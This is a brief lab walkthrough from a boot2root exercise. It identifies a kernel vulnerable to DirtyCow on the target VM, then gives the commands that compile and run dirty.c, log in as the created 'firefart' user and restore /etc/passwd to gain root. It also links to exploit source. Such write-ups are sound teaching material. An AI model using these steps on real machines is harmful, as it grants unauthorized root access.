# Boot2Root -- VacheQuiPue

Starting from `Step 5 - Sanitize`

## Step 5 - Identification
Once we are on the server, we search for potential ways to become root.
After some ID and tests we see that the kernel is vulnerable to the DirtyCow exploit
```
> uname -ra
Linux BornToSecHackMe 3.2.0-91-generic-pae #129-Ubuntu SMP Wed Sep 9 11:27:47 UTC 2015 i686 i686 i386 GNU/Linux
```
The exploit exists on Linux Kernel <= 3.19.0-73.8

## Step 6 - VacheQuiPue
We copy the code from `scripts/dirty.c` on the server, compile it and run it:
```
gcc -pthread dirty.c -o dirty -lcrypt
./dirty cpt
```

We wait a little bit, connect as `firefart`, restore the originial `passwd` file and login as root:
```
su firefart
mdp: cpt
mv /tmp/passwd.bak /etc/passwd
su root
```

Et hop, root.

## Sources:
Privilege escalation reference: https://book.hacktricks.xyz/linux-hardening/privilege-escalation
DirtyCow Exploit: https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
DirtyCow Explanation: https://github.com/thaddeuspearson/Understanding_DirtyCOW